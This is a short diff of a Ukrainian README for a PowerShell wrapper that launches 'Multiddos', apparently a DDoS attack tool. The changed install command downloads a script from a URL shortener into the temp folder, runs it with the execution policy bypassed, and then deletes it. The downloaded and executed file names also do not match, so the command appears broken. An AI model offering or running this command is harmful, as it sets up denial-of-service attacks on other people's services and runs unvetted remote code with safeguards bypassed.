@@ -15,7 +15,7 @@ PowerShell-враппер для запуску Multiddos на Windows.
 - Розпакувати архів в будь який каталог і запустити з нього <code>pwsh.exe</code>
 - Виконати команду:
 ```
-(new-object System.Net.WebClient).DownloadFile("https://tiny.one/jxr7yadn", "$env:tmp\setup.ps1"); &"$PsHome\pwsh.exe -executionpolicy bypass -file $env:tmp\Setup1.ps1";ri "$env:tmp\Setup.ps1"
+(new-object System.Net.WebClient).DownloadFile("https://tiny.one/jxr7yadn", "$env:tmp\setup.ps1"); &"$PsHome\pwsh.exe" -executionpolicy bypass -file "$env:tmp\Setup1.ps1";ri "$env:tmp\Setup.ps1"
 ```
 2. Windows 10 білд 1803 і новіше:
 - Скопіювати команду
